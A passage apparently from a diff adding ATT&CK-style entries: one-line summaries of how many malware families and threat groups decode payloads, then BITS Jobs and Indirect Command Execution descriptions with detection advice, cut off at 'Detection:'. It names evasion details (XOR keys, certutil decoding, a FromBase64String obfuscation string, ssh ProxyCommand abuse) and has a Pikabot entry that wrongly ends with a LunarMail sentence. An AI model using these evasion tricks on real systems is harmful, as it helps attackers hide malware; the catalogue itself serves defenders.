+- [S0638] Babuk: Babuk has the ability to unpack itself into memory using XOR.
+- [S0127] BBSRAT: BBSRAT uses Expand to decompress a CAB file into executable content.
+- [S0663] SysUpdate: SysUpdate can deobfuscate packed binaries in memory.
+- [S0447] Lokibot: Lokibot has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.
+- [S0223] POWERSTATS: POWERSTATS can deobfuscate the main backdoor code.
+- [S0269] QUADAGENT: QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.
+- [G0090] WIRTE: WIRTE has used Base64 to decode malicious VBS script.
+- [S0636] VaporRage: VaporRage can deobfuscate XOR-encoded shellcode prior to execution.
+- [G0078] Gorgon Group: Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file.
+- [S1164] UPSTYLE: UPSTYLE encodes its main content prior to loading via Python as base64-encoded blobs.
+- [G0094] Kimsuky: Kimsuky has decoded malicious VBScripts using Base64.
+- [S0532] Lucifer: Lucifer can decrypt its C2 address upon execution.
+- [S0640] Avaddon: Avaddon has decrypted encrypted strings.
+- [S1186] Line Dancer: Line Dancer shellcode payloads are base64 encoded when transmitted to compromised devices.
+- [S0615] SombRAT: SombRAT can run upload to decrypt and upload files from storage.
+- [G1036] Moonstone Sleet: Moonstone Sleet delivered payloads using multiple rounds of obfuscation and encoding to evade defenses and analysis.
+- [S1026] Mongall: Mongall has the ability to decrypt its payload prior to execution.
+- [S1115] WIREFIRE: WIREFIRE can decode, decrypt, and decompress data received in C2 HTTP `POST` requests.
+- [S0661] FoggyWeb: FoggyWeb can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.
+- [S0434] Imminent Monitor: Imminent Monitor has decoded malware components that are then dropped to the system.
+- [C0005] Operation Spalax: For Operation Spalax, the threat actors used a variety of packers and droppers to decrypt malicious payloads.
+- [S1113] RAPIDPULSE: RAPIDPULSE listens for specific HTTP query parameters in received communications. If specific parameters match, a hard-coded RC4 key is used to decrypt the HTTP query paremter hmacTime. This decrypts to a filename that is then open, read, encrypted with the same RC4 key, base64-encoded, written to standard out, then passed as a response to the HTTP request.
+- [S0456] Aria-body: Aria-body has the ability to decrypt the loader configuration and payload DLL.
+- [S0596] ShadowPad: ShadowPad has decrypted a binary blob to start execution.
+- [S1076] QUIETCANARY: QUIETCANARY can use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them.
+- [S0188] Starloader: Starloader decrypts and executes shellcode from a file called Stars.jps.
+- [S0436] TSCookie: TSCookie has the ability to decrypt, load, and execute a DLL and its resources.
+- [S0575] Conti: Conti has decrypted its payload using a hardcoded AES-256 key.
+- [S0236] Kwampirs: Kwampirs decrypts and extracts a copy of its main DLL payload when executing.
+- [S0629] RainyDay: RainyDay can decrypt its payload via a XOR key.
+- [S0255] DDKONG: DDKONG decodes an embedded configuration using XOR.
+- [S0361] Expand: Expand can be used to decompress a local or remote CAB file into an executable.
+- [S0354] Denis: Denis will decrypt important strings used for C&C communication.
+- [S1039] Bumblebee: Bumblebee can deobfuscate C2 server responses and unpack its code on targeted hosts.
+- [G1030] Agrius: Agrius has deployed base64-encoded variants of ASPXSpy to evade detection.
+- [S0355] Final1stspy: Final1stspy uses Python code to deobfuscate base64-encoded strings.
+- [G0004] Ke3chang: Ke3chang has deobfuscated Base64-encoded shellcode strings prior to loading them.
+- [S0635] BoomBox: BoomBox can decrypt AES-encrypted files downloaded from C2.
+- [S1041] Chinoxy: The Chinoxy dropping function can initiate decryption of its config file.
+- [S0344] Azorult: Azorult uses an XOR key to decrypt content and uses Base64 to decode the C2 address.
+- [S0373] Astaroth: Astaroth uses a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and to hide its code.
+- [S0650] QakBot: QakBot can deobfuscate and re-assemble code strings for execution.
+- [S1142] LunarMail: LunarMail can decrypt strings to retrieve configuration settings.
+- [S0603] Stuxnet: Stuxnet decrypts resources that are loaded into memory and executed.
+- [S0457] Netwalker: Netwalker's PowerShell script can decode and decrypt multiple layers of obfuscation, leading to the Netwalker DLL being loaded into memory.
+- [S1213] Lumma Stealer: Lumma Stealer has used Base64-encoded content during execution, decoded via PowerShell.
+- [S1030] Squirrelwaffle: Squirrelwaffle has decrypted files and payloads using a XOR-based algorithm.
+- [S0622] AppleSeed: AppleSeed can decode its payload prior to execution.
+- [S0469] ABK: ABK has the ability to decrypt AES encrypted payloads.
+- [S0264] OopsIE: OopsIE concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.
+- [G0082] APT38: APT38 has used the RC4 algorithm to decrypt configuration data.
+- [G1017] Volt Typhoon: Volt Typhoon has used Base64-encoded data to transfer payloads and commands, including deobfuscation via certutil.
+- [S1051] KEYPLUG: KEYPLUG can decode its configuration file to determine C2 protocols.
+- [S1119] LIGHTWIRE: LIGHTWIRE can RC4 decrypt and Base64 decode C2 commands.
+- [S0430] Winnti for Linux: Winnti for Linux has decoded XOR encoded strings holding its configuration upon execution.
+- [S0674] CharmPower: CharmPower can decrypt downloaded modules prior to execution.
+- [S0377] Ebury: Ebury has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.
+- [S1060] Mafalda: Mafalda can decrypt files and data.
+- [G0021] Molerats: Molerats decompresses ZIP files once on the victim machine.
+- [S0268] Bisonal: Bisonal has decoded strings in the malware using XOR and RC4.
+- [C0017] C0017: During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads.
+- [G0012] Darkhotel: Darkhotel has decrypted strings and imports using RC4 during execution.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D uses a decode routine combining bit shifting and XOR operations with a variable key that depends on the length of the string that was encoded. If the computation for the variable XOR key turns out to be 0, the default XOR key of 0x1B is used. This routine is also referenced as the `rotate` function in reporting.
+- [S1032] PyDCrypt: PyDCrypt has decrypted and dropped the DCSrv payload to disk.
+- [S0448] Rising Sun: Rising Sun has decrypted itself using a single-byte XOR scheme. Additionally, Rising Sun can decrypt its configuration data at runtime.
+- [S0115] Crimson: Crimson can decode its encoded PE file prior to execution.
+- [S0678] Torisma: Torisma has used XOR and Base64 to decode C2 data.
+- [S1027] Heyoka Backdoor: Heyoka Backdoor can decrypt its payload prior to execution.
+- [G1006] Earth Lusca: Earth Lusca has used certutil to decode a string into a cabinet file.
+- [S0667] Chrommme: Chrommme can decrypt its encrypted internal code.
+- [S0239] Bankshot: Bankshot decodes embedded XOR strings.
+- [S0257] VERMIN: VERMIN decrypts code, strings, and commands to use once it's on the victim's machine.
+- [S0395] LightNeuron: LightNeuron has used AES and XOR to decrypt configuration files and commands.
+- [S0487] Kessel: Kessel has decrypted the binary's configuration once the main function was launched.
+- [S1117] GLASSTOKEN: GLASSTOKEN has the ability to decode hexadecimal and Base64 C2 requests.
+- [S0189] ISMInjector: ISMInjector uses the certutil command to decode a payload file.
+- [G1046] Storm-1811: Storm-1811 has distributed password-protected archives such as ZIP files during intrusions.
+- [S1085] Sardonic: Sardonic can first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing.
+- [G0128] ZIRCONIUM: ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.
+- [G0069] MuddyWater: MuddyWater has decoded base64-encoded PowerShell, JavaScript, and VBScript.
+- [S0160] certutil: certutil has been used to decode binaries hidden inside certificate files as Base64 information.
+- [S1059] metaMain: metaMain can decrypt and load other modules.
+- [S1179] Exbyte: Exbyte decodes and decrypts data stored in the configuration file with a key provided on the command line during execution.
+- [S1160] Latrodectus: Latrodectus has the ability to deobfuscate encrypted strings.
+- [S0011] Taidoor: Taidoor can use a stream cipher to decrypt stings used by the malware.
+- [S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can use an embedded RC4 key to decrypt Windows API function strings.
+- [S1168] SampleCheck5000: SampleCheck5000 can decode and decrypt command line strings and files received through C2.
+- [S1141] LunarWeb: LunarWeb can decrypt strings related to communication configuration using RC4 with a static key.
+- [S1110] SLIGHTPULSE: SLIGHTPULSE can deobfuscate base64 encoded and RC4 encrypted C2 messages.
+- [S0495] RDAT: RDAT can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.
+- [S1153] Cuckoo Stealer: Cuckoo Stealer strings are deobfuscated prior to execution.
+- [S0554] Egregor: Egregor has been decrypted before execution.
+- [G0049] OilRig: A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.
+- [S1212] RansomHub: RansomHub can use a provided passphrase to decrypt its configuration file.
+- [S1159] DUSTTRAP: DUSTTRAP deobfuscates embedded payloads.
+- [S0634] EnvyScout: EnvyScout can deobfuscate and write malicious ISO files to disk.
+- [S0482] Bundlore: Bundlore has used openssl to decrypt AES encrypted payload data. Bundlore has also used base64 and RC4 with a hardcoded key to deobfuscate data.
+- [S0398] HyperBro: HyperBro can unpack and decrypt its payload prior to execution.
+- [S0024] Dyre: Dyre decrypts resources needed for targeting the victim.
+- [S0579] Waterbear: Waterbear has the ability to decrypt its RC4 encrypted payload for execution.
+- [S0386] Ursnif: Ursnif has used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.
+- [S0401] Exaramel for Linux: Exaramel for Linux can decrypt its configuration file.
+- [S1150] ROADSWEEP: ROADSWEEP can decrypt embedded scripts prior to execution.
+- [S0473] Avenger: Avenger has the ability to decrypt files downloaded from C2.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware.
+- [C0051] APT28 Nearest Neighbor Campaign: During APT28 Nearest Neighbor Campaign, APT28 unarchived data using the GUI version of WinRAR.
+- [S1053] AvosLocker: AvosLocker has deobfuscated XOR-encoded strings.
+- [S0388] YAHOYAH: YAHOYAH decrypts downloaded files before execution.
+- [S1199] LockBit 2.0: LockBit 2.0 can decode scripts and strings in loaded modules.
+- [S1022] IceApple: IceApple can use a Base64-encoded AES key to decrypt tasking.
+- [S0470] BBK: BBK has the ability to decrypt AES encrypted payloads.
+- [S0263] TYPEFRAME: One TYPEFRAME variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value "0x35".
+- [S1100] Ninja: The Ninja loader component can decrypt and decompress the payload.
+- [S1210] Sagerunex: Sagerunex uses a custom decryption routine to unpack itself during installation.
+- [S1143] LunarLoader: LunarLoader can deobfuscate files containing the next stages in the infection chain.
+- [S0147] Pteranodon: Pteranodon can decrypt encrypted data strings prior to using them.
+- [S1047] Mori: Mori can resolve networking APIs from strings that are ADD-encrypted.
+- [S0367] Emotet: Emotet has used a self-extracting RAR file to deliver modules to victims. Emotet has also extracted embedded executables from files using hard-coded buffer offsets.
+- [S0670] WarzoneRAT: WarzoneRAT can use XOR 0x45 to decrypt obfuscated code.
+- [S1063] Brute Ratel C4: Brute Ratel C4 has the ability to deobfuscate its payload prior to execution.
+- [S0690] Green Lambert: Green Lambert can use multiple custom routines to decrypt strings prior to execution.
+- [S0279] Proton: Proton uses an encrypted file to store commands and configuration values.
+- [S1138] Gootloader: Gootloader has the ability to decode and decrypt malicious payloads prior to execution.
+- [S1139] INC Ransomware: INC Ransomware can run `CryptStringToBinaryA` to decrypt base64 content containing its ransom note.
+- [S0641] Kobalos: Kobalos decrypts strings right after the initial communication, but before the authentication process.
+- [S0414] BabyShark: BabyShark has the ability to decode downloaded files prior to execution.
+- [S0335] Carbon: Carbon decrypts task and configuration files for execution.
+- [S0697] HermeticWiper: HermeticWiper can decompress and copy driver files using `LZCopy`.
+- [S0375] Remexi: Remexi decrypts the configuration data using XOR with 25-character keys.
+- [S0032] gh0st RAT: gh0st RAT has decrypted and loaded the gh0st RAT DLL into memory, once the initial dropper executable is launched.
+- [G0047] Gamaredon Group: Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader. Additionally, Gamaredon Group has decoded Telegram content to reveal the IP address for C2 communications.
+- [S1065] Woody RAT: Woody RAT can deobfuscate Base64-encoded strings and scripts.
+- [S0402] OSX/Shlayer: OSX/Shlayer can base64-decode and AES-decrypt downloaded payloads. Versions of OSX/Shlayer pass encrypted and password-protected code to openssl and then write the payload to the /tmp folder.
+- [S1050] PcShare: PcShare has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.
+- [G0092] TA505: TA505 has decrypted packed DLLs with an XOR key.
+- [S0492] CookieMiner: CookieMiner has used Google Chrome's decryption and extraction operations.
+- [S0547] DropBook: DropBook can unarchive data downloaded from the C2 to obtain the payload and persistence modules.
+- [S0511] RegDuke: RegDuke can decrypt strings with a key either stored in the Registry or hardcoded in the code.
+- [S0140] Shamoon: Shamoon decrypts ciphertext using an XOR cipher and a base64-encoded string.
+- [G0027] Threat Group-3390: During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.
+- [G0007] APT28: An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.
+- [S1158] DUSTPAN: DUSTPAN decodes and decrypts embedded payloads.
+- [S1097] HUI Loader: HUI Loader can decrypt and load files containing malicious payloads.
+- [S0468] Skidmap: Skidmap has the ability to download, unpack, and decrypt tar.gz files .
+- [S0240] ROKRAT: ROKRAT can decrypt strings using the victim's hostname as the key.
+- [S0623] Siloscape: Siloscape has decrypted the password of the C2 server with a simple byte by byte XOR. Siloscape also writes both an archive of Tor and the unzip binary to disk from data embedded within the payload using Visual Studio’s Resource Manager.
+- [S0443] MESSAGETAP: After checking for the existence of two files, keyword_parm.txt and parm.txt, MESSAGETAP XOR decodes and read the contents of the files.
+- [S0444] ShimRat: ShimRat has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.
+- [S0502] Drovorub: Drovorub has de-obsfuscated XOR encrypted payloads in WebSocket messages.
+- [S0588] GoldMax: GoldMax has decoded and decrypted the configuration file when executed.
+- [S0576] MegaCortex: MegaCortex has used a Base64 key to decode its components.
+- [G0139] TeamTNT: TeamTNT has used a script that decodes a Base64-encoded version of WeaveWorks Scope.
+- [G1035] Winter Vivern: Winter Vivern delivered exploit payloads via base64-encoded payloads in malicious email messages.
+- [S0681] Lizar: Lizar can decrypt its configuration data.
+- [S0647] Turian: Turian has the ability to use a XOR decryption key to extract C2 server domains and IP addresses.
+- [S0610] SideTwist: SideTwist can decode and decrypt messages received from C2.
+- [S0496] REvil: REvil can decode encrypted strings to enable execution of commands and payloads.
+- [S0331] Agent Tesla: Agent Tesla has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.
+- [S1016] MacMa: MacMa decrypts a downloaded file using AES-128-EBC with a custom delta.
+- [S1052] DEADEYE: DEADEYE has the ability to combine multiple sections of a binary which were broken up to evade detection into a single .dll prior to execution.
+- [S0515] WellMail: WellMail can decompress scripts received from C2.
+- [C0021] C0021: During C0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string `'FromBase'+0x40+'String'`, in place of `FromBase64String` which is normally used to decode base64.
+- [S0369] CoinTicker: CoinTicker decodes the initially-downloaded hidden encoded file using OpenSSL.
+- [S0673] DarkWatchman: DarkWatchman has the ability to self-extract as a RAR archive.
+- [S0546] SharpStage: SharpStage has decompressed data received from the C2 server.
+- [G0045] menuPass: menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim’s machine when dropping UPPERCUT.
+- [S1111] DarkGate: DarkGate installation includes binary code stored in a file located in a hidden directory, such as shell.txt, that is decrypted then executed. DarkGate uses hexadecimal-encoded shellcode payloads during installation that are called via Windows API CallWindowProc() to decode and then execute.
+- [S1134] DEADWOOD: DEADWOOD XORs some strings within the binary using the value 0xD5, and deobfuscates these items at runtime.
+- [S0589] Sibot: Sibot can decrypt data received from a C2 and save to a file.
+- [S0637] NativeZone: NativeZone can decrypt and decode embedded Cobalt Strike beacon stage shellcode.
+- [S0517] Pillowmint: Pillowmint has been decompressed by included shellcode prior to being launched.
+- [G0032] Lazarus Group: Lazarus Group has used shellcode within macros to decrypt and manually map DLLs and shellcode into memory at runtime.
+- [S0601] Hildegard: Hildegard has decrypted ELF files with AES.
+- [S0126] ComRAT: ComRAT has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. ComRAT has also used a unique password to decrypt the file used for its hidden file system.
+- [S0531] Grandoreiro: Grandoreiro can decrypt its encrypted internal strings.
+- [S0660] Clambling: Clambling can deobfuscate its payload prior to execution.
+- [S0266] TrickBot: TrickBot decodes the configuration data and modules.
+- [S0618] FIVEHANDS: FIVEHANDS has the ability to decrypt its payload prior to execution.
+- [S1190] Kapeka: Kapeka utilizes obfuscated JSON structures for various data storage and configuration management items.
+- [S1018] Saint Bot: Saint Bot can deobfuscate strings and files for execution.
+- [S0154] Cobalt Strike: Cobalt Strike can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.
+- [S1019] Shark: Shark can extract and decrypt downloaded .zip files.
+- [S0581] IronNetInjector: IronNetInjector has the ability to decrypt embedded .NET and PE payloads.
+- [S0543] Spark: Spark has used a custom XOR algorithm to decrypt the payload.
+- [G1043] BlackByte: BlackByte has encoded commands in base64-encoded sections concatenated together in PowerShell. BlackByte uses PowerShell commands to disable Windows Defender.
+- [S0439] Okrum: Okrum's loader can decrypt the backdoor code, embedded within the loader or within a legitimate PNG file. A custom XOR cipher or RC4 is used for decryption.
+- [S0466] WindTail: WindTail has the ability to decrypt strings using hard-coded AES keys.
+- [S1207] XLoader: XLoader uses XOR and RC4 algorithms to decrypt payloads and functions. XLoader can be distributed as a self-extracting RAR archive that launches an AutoIT loader.
+- [S0260] InvisiMole: InvisiMole can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.
+- [S0394] HiddenWasp: HiddenWasp uses a cipher to implement a decoding function.
+- [S0665] ThreatNeedle: ThreatNeedle can decrypt its payload using RC4, AES, or one-byte XORing.
+- [S0390] SQLRat: SQLRat has scripts that are responsible for deobfuscating additional scripts.
+- [S0562] SUNSPOT: SUNSPOT decrypts SUNBURST, which was stored in AES128-CBC encrypted blobs.
+- [S0476] Valak: Valak has the ability to decode and decrypt downloaded files.
+- [G0065] Leviathan: Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.
+- [S0560] TEARDROP: TEARDROP was decoded using a custom rolling XOR algorithm to execute a customized Cobalt Strike payload.
+- [S0196] PUNCHBUGGY: PUNCHBUGGY has used PowerShell to decode base64-encoded assembly.
+- [S0353] NOKKI: NOKKI uses a unique, custom de-obfuscation technique.
+- [G1021] Cinnamon Tempest: Cinnamon Tempest has used weaponized DLLs to load and decrypt payloads.
+- [S1145] Pikabot: Pikabot decrypts command and control URIs using ADVobfuscator, and decrypts IP addresses and port numbers with a custom algorithm. Other versions of Pikabot decode chunks of stored stage 2 payload content in the initial payload .text section before consolidating them for further execution. Overall LunarMail is associated with multiple encoding and encryption mechanisms to obfuscate the malware's presence and avoid analysis or detection.
+- [S1182] MagicRAT: MagicRAT stores command and control URLs using base64 encoding in the malware's configuration file.
+- [S0613] PS1: PS1 can use an XOR key to decrypt a PowerShell loader and payload binary.
+- [S0348] Cardinal RAT: Cardinal RAT decodes many of its artifacts and is decrypted (AES-128) after being downloaded.
+- [S1173] PowerExchange: PowerExchange can decode and decrypt C2 commands received via email.
+- [S0689] WhisperGate: WhisperGate can deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations.
+- [G0106] Rocke: Rocke has extracted tar.gz files after downloading them from a C2 server.
+- [S0632] GrimAgent: GrimAgent can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.
+- [C0037] Water Curupira Pikabot Distribution: Water Curupira Pikabot Distribution used highly obfuscated JavaScript files as one initial installer for Pikabot.
+- [S1046] PowGoop: PowGoop can decrypt PowerShell scripts for execution.
+- [S1183] StrelaStealer: StrelaStealer payloads have included strings encrypted via XOR. StrelaStealer JavaScript payloads utilize Base64-encoded payloads that are decoded via certutil to create a malicious DLL file.
+- [S0514] WellMess: WellMess can decode and decrypt data received from C2.
+- [S0628] FYAnti: FYAnti has the ability to decrypt an embedded .NET module.
+- [S1130] Raspberry Robin: Raspberry Robin contains several layers of obfuscation to hide malicious code from detection and analysis.
+- [S0477] Goopy: Goopy has used a polymorphic decryptor to decrypt itself at runtime.
+- [S0612] WastedLocker: WastedLocker's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.
+- [S0013] PlugX: PlugX decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.
+- [S1105] COATHANGER: COATHANGER decodes configuration items from a bundled file for command and control activity.
+- [S0585] Kerrdown: Kerrdown can decode, decrypt, and decompress multiple layers of shellcode.
+- [S1014] DanBot: DanBot can use a VBA macro to decode its payload prior to installation and execution.
+- [S1031] PingPull: PingPull can decrypt received data from its C2 server by using AES.
+- [S0642] BADFLICK: BADFLICK can decode shellcode using a custom rotating XOR cipher.
+- [S0022] Uroburos: Uroburos can decrypt command parameters sent through C2 and use unpacking code to extract its packed executable.
+- [S0501] PipeMon: PipeMon can decrypt password-protected executables.
+- [S1180] BlackByte Ransomware: BlackByte Ransomware is distributed as an obfuscated JavaScript launcher file.
+- [S0258] RGDoor: RGDoor decodes Base64 strings and decrypts strings using a custom XOR algorithm.
+- [S0182] FinFisher: FinFisher extracts and decrypts stage 3 malware, which is stored in encrypted resources.
+- [G0081] Tropic Trooper: Tropic Trooper used shellcode with an XOR algorithm to decrypt a payload. Tropic Trooper also decrypted image files which contained a payload.
+- [G1016] FIN13: FIN13 has utilized `certutil` to decode base64 encoded versions of custom malware.
+- [S1025] Amadey: Amadey has decoded antivirus name strings.
+- [S1112] STEADYPULSE: STEADYPULSE can URL decode key/value pairs sent over C2.
+- [C0001] Frankenstein: During Frankenstein, the threat actors deobfuscated Base64-encoded commands following the execution of a malicious script, which revealed a small script designed to obtain an additional payload.
+- [S0347] AuditCred: AuditCred uses XOR and RC4 to perform decryption on the code functions.
+- [S0141] Winnti for Windows: The Winnti for Windows dropper can decrypt and decompresses a data blob.
+- [S0534] Bazar: Bazar can decrypt downloaded payloads. Bazar also resolves strings and other artifacts at runtime.
+- [S1148] Raccoon Stealer: Raccoon Stealer uses RC4-encrypted, base64-encoded strings to obfuscate functionality and command and control servers.
+- [S0428] PoetRAT: PoetRAT has used LZMA and base64 libraries to decode obfuscated scripts.
+- [G0034] Sandworm Team: Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.
+- [S1012] PowerLess: PowerLess can use base64 and AES ECB decryption prior to execution of downloaded modules.
+- [S0052] OnionDuke: OnionDuke can use a custom decryption algorithm to decrypt strings.
+- [C0016] Operation Dust Storm: During Operation Dust Storm, attackers used VBS code to decode payloads.
+- [S0251] Zebrocy: Zebrocy decodes its secondary payload and writes it to the victim’s machine. Zebrocy also uses AES and XOR to decrypt strings and payloads.
+- [G1026] Malteiro: Malteiro has the ability to deobfuscate downloaded files prior to execution.
+- [S0330] Zeus Panda: Zeus Panda decrypts strings in the code during the execution process.
+- [S1140] Spica: Upon execution Spica can decode an embedded .pdf and write it to the desktop as a decoy document.
+- [S1123] PITSTOP: PITSTOP can deobfuscate base64 encoded and AES encrypted commands.
+- [S0475] BackConfig: BackConfig has used a custom routine to decrypt strings.
+- [S0687] Cyclops Blink: Cyclops Blink can decrypt and parse instructions sent from C2.
+- [S0520] BLINDINGCAN: BLINDINGCAN has used AES and XOR to decrypt its DLLs.
+- [S1120] FRAMESTING: FRAMESTING can decompress data received within `POST` requests.
+- [S0631] Chaes: Chaes has decrypted an AES encrypted binary file to trigger the download of other files.
+- [S0234] Bandook: Bandook has decoded its PowerShell script.
+- [S0516] SoreFang: SoreFang can decode and decrypt exfiltrated data sent to C2.
+- [S0458] Ramsay: Ramsay can extract its agent from the body of a malicious document.
+- [S0280] MirageFox: MirageFox has a function for decrypting data containing C2 configuration information.
+- [S0653] xCaon: xCaon has decoded strings from the C2 server before executing commands.
+- [S0455] Metamorfo: Upon execution, Metamorfo has unzipped itself after being downloaded to the system and has performed string decryption.
+- [S1118] BUSHWALK: BUSHWALK can Base64 decode and RC4 decrypt malicious payloads sent through a web request’s command parameter.
+- [S0526] KGH_SPY: KGH_SPY can decrypt encrypted strings and write them to a newly created folder.
+- [S0614] CostaBricks: CostaBricks has the ability to use bytecode to decrypt embedded payloads.
+- [S0270] RogueRobin: RogueRobin decodes an embedded executable using base64 and decompresses it.
+- [S0604] Industroyer: Industroyer decrypts code to connect to a remote C2 server.
+- [S1200] StealBit: StealBit can deobfuscate loaded modules prior to execution.
+- [S1170] ODAgent: ODAgent can Base64-decode and XOR decrypt received C2 commands.
+- [S1172] OilBooster: OilBooster can Base64-decode and XOR-decrypt C2 commands taken from JSON files.
+- [S1013] ZxxZ: ZxxZ has used a XOR key to decrypt strings.
+- [S1133] Apostle: Apostle compiled code is obfuscated in an unspecified fashion prior to delivery to victims.
+- [C0006] Operation Honeybee: During Operation Honeybee, malicious files were decoded prior to execution.
+- [G0073] APT19: An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.
+- [S0624] Ecipekac: Ecipekac has the ability to decrypt fileless loader modules.
+- [G0126] Higaisa: Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.
+- [S0512] FatDuke: FatDuke can decrypt AES encrypted C2 communications.
+- [S1147] Nightdoor: Nightdoor stores network configuration data in a file XOR encoded with the key value of `0x7A`.
+- [C0046] ArcaneDoor: ArcaneDoor involved the use of Base64 obfuscated scripts and commands.
+- [S0180] Volgmer: Volgmer deobfuscates its strings and APIs once its executed.
+- [S0582] LookBack: LookBack has a function that decrypts malicious data.
+- [S0518] PolyglotDuke: PolyglotDuke can use a custom algorithm to decrypt strings used by the malware.
+- [S0565] Raindrop: Raindrop decrypted its Cobalt Strike payload using an AES-256 encryption algorithm in CBC mode with a unique key per sample.
+- [S0567] Dtrack: Dtrack has used a decryption routine that is part of an executable physical patch.
+- [S0499] Hancitor: Hancitor has decoded Base64 encoded URLs to insert a recipient’s name into the filename of the Word document. Hancitor has also extracted executables from ZIP files.
+
+
+### T1197 - BITS Jobs
+
+Description:
+
+Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations. The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool. Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.
+
+Detection:
+
+BITS runs as a service and its status can be checked with the Sc query utility (sc query bits). Active BITS tasks can be enumerated using the BITSAdmin tool (bitsadmin /list /allusers /verbose). Monitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options) Admin logs, PowerShell logs, and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).
+
+Procedures:
+
+- [S0652] MarkiRAT: MarkiRAT can use BITS Utility to connect with the C2 server.
+- [G0040] Patchwork: Patchwork has used BITS jobs to download malicious payloads.
+- [S0534] Bazar: Bazar has been downloaded via Windows BITS functionality.
+- [S0154] Cobalt Strike: Cobalt Strike can download a hosted "beacon" payload using BITSAdmin.
+- [S0554] Egregor: Egregor has used BITSadmin to download and execute malicious DLLs.
+- [S0201] JPIN: A JPIN variant downloads the backdoor payload via the BITS service.
+- [S0333] UBoatRAT: UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence.
+- [S0654] ProLock: ProLock can use BITS jobs to download its malicious payload.
+- [G0065] Leviathan: Leviathan has used BITSAdmin to download additional tools.
+- [G0087] APT39: APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.
+- [S0190] BITSAdmin: BITSAdmin can be used to create BITS Jobs to launch a malicious process.
+- [G0096] APT41: APT41 used BITSAdmin to download and install payloads.
+- [G0102] Wizard Spider: Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine.
+
+
+### T1202 - Indirect Command Execution
+
+Description:
+
+Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts. Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file. Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.
+
+Detection:
+
